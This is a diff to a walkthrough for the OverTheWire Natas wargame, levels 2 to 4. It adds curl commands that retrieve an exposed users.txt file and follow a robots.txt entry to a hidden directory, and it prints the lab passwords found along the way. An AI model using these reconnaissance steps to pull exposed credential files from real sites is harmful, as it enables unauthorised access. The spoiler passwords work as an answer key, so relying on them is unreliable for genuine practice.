@@ -41,8 +41,8 @@ Credential : natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
 
 ```
 http://natas2.natas.labs.overthewire.org/files/
-http://natas2.natas.labs.overthewire.org/files/users.txt
 
+$ curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
 # username:password
 alice:BYNdCesZqW
 bob:jw2ueICLvT
@@ -56,3 +56,15 @@ Credential : natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 
 
 ## Natas Level 3 → Level 4
+
+`<!-- No more information leaks!! Not even Google will find it this time... -->`
+
+```
+$ curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
+User-agent: *
+Disallow: /s3cr3t/
+$ curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+```
+
+Credential : `natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
